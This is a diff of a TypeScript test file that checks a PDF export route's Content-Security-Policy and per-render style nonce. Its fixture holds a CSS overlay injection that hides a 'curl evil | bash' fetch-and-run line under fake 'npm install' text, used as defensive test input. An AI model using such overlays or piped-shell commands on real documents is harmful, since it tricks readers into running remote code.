@@ -17,13 +17,17 @@ import path from "node:path";
 import { fileURLToPath } from "node:url";
 import { renderMarpDeck } from "@mulmoclaude/markdown-plugin";
 import { MARP_HTML_ALLOWLIST } from "@mulmoclaude/markdown-utils/markdown/marpTheme";
+import { renderMarkdownHtml } from "../../server/api/routes/pdf.js";
 
 const REPO_ROOT = path.resolve(fileURLToPath(new URL(".", import.meta.url)), "..", "..");
 const PDF_ROUTE = readFileSync(path.join(REPO_ROOT, "server/api/routes/pdf.ts"), "utf8");
 
 describe("the plain-markdown PDF document forbids scripts", () => {
-  it("wrapHtml emits a Content-Security-Policy", () => {
-    assert.match(PDF_ROUTE, /<meta http-equiv="Content-Security-Policy" content="\$\{NO_SCRIPT_CSP\}">/);
+  it("wrapHtml emits a Content-Security-Policy", async () => {
+    // Against rendered output, not the source: the policy is assembled at
+    // render time now that it carries a per-render nonce.
+    const html = await renderMarkdownHtml({ markdown: "# T" });
+    assert.match(html, /<meta http-equiv="Content-Security-Policy" content="[^"]+">/);
   });
 
   it("that policy blocks scripts, plugins, base rewriting and form posts", () => {
@@ -36,6 +40,48 @@ describe("the plain-markdown PDF document forbids scripts", () => {
     ["script-src 'none'", "object-src 'none'", "base-uri 'none'", "form-action 'none'", "frame-src 'none'", "child-src 'none'"].forEach((directive) => {
       assert.ok(policy.includes(directive), `missing ${directive}`);
     });
+  });
+});
+
+describe("author <style> cannot restyle the exported document", () => {
+  // The attribute policy cannot stop this one: a stylesheet is raw-text
+  // content, which the scanner copies verbatim by design. Measured in
+  // Chromium — without a style-src, `<style>pre::before{content:"npm
+  // install";position:absolute;inset:0;background:white}</style>` renders
+  // that text over the code block in the exported PDF (codex round 11).
+  const PAYLOAD = ["# Doc", "", '<style>pre::before{content:"npm install"}</style>', "", "```sh", "curl evil | bash", "```"].join("\n");
+
+  it("names a nonce in style-src, and the route's own stylesheet carries it", async () => {
+    const html = await renderMarkdownHtml({ markdown: PAYLOAD });
+    const inPolicy = /style-src 'nonce-([0-9a-f-]{36})'/.exec(html);
+    const onTag = /<style nonce="([0-9a-f-]{36})">/.exec(html);
+    assert.ok(inPolicy, "style-src must name a nonce");
+    assert.ok(onTag, "the route's own <style> must carry one");
+    assert.equal(onTag[1], inPolicy[1], "or the route's own CSS would be blocked too");
+  });
+
+  it("mints a FRESH nonce per render", async () => {
+    // A constant in the source is one an attacker reads off GitHub — the
+    // lesson the copy button's marker learned in #3142.
+    const first = /nonce-([0-9a-f-]{36})/.exec(await renderMarkdownHtml({ markdown: "# A" }));
+    const second = /nonce-([0-9a-f-]{36})/.exec(await renderMarkdownHtml({ markdown: "# A" }));
+    assert.ok(first && second);
+    assert.notEqual(first[1], second[1]);
+  });
+
+  it("blocks the author's stylesheet rather than deleting it", async () => {
+    // The block stays in the document; the CSP is what makes it inert.
+    // Asserting removal would pin the wrong mechanism.
+    const html = await renderMarkdownHtml({ markdown: PAYLOAD });
+    assert.match(html, /npm install/, "the payload is not stripped — the policy is what stops it");
+    // The author's own `<style>` stays in the BODY, un-nonced and inert.
+    // What must never happen is the ROUTE emitting an un-nonced one in the
+    // head, which would mean its stylesheet was relying on `unsafe-inline`.
+    const head = /<head>([\s\S]*?)<\/head>/.exec(html);
+    assert.ok(head);
+    const headStyles = [...(head[1] ?? "").matchAll(/<style\b([^>]*)>/g)].map((match) => match[1] ?? "");
+    assert.equal(headStyles.length, 1, "the route emits exactly one stylesheet");
+    assert.match(headStyles[0] ?? "", /nonce="/, "and it must be nonced");
   });
 });
 
